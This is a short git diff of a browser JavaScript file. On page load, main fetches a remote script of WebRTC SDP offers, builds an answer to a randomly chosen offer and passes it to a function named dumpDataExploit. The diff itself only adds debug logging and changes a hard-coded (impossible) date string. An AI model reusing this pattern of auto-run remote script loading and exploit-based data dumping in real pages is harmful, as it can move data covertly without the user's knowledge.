@@ -98,15 +98,25 @@ const dumpDataExploit = async (data, sdpIndex, chunkSize = 128) => {
 };
 
 async function main() {
-  const dateStr = "2023-06-31-18";
+  // Filename
+  const dateStr = "2023-06-31-19";
   // const dateStr = getHourlyFilename(new Date());
   const filename = `${connectionInfo.offersUrl}/${dateStr}.js`;
+  console.log("filename", filename);
+
   await addScriptToDocument(filename);
   const offers = window.sdp;
+  console.log("read offers", offers);
+
   let sdpIndex = ~~(Math.random() * offers.length);
   const sdp = offers[sdpIndex];
+  console.log("Selected offer", sdpIndex, JSON.stringify(sdp));
+
   const answer = await getAnswerFromOffer(sdp);
+  console.log("offer -> answer", JSON.stringify(answer));
+
   dumpDataExploit(answer, sdpIndex);
+  console.log("dumped data");
 }
 
 document.addEventListener("DOMContentLoaded", main);
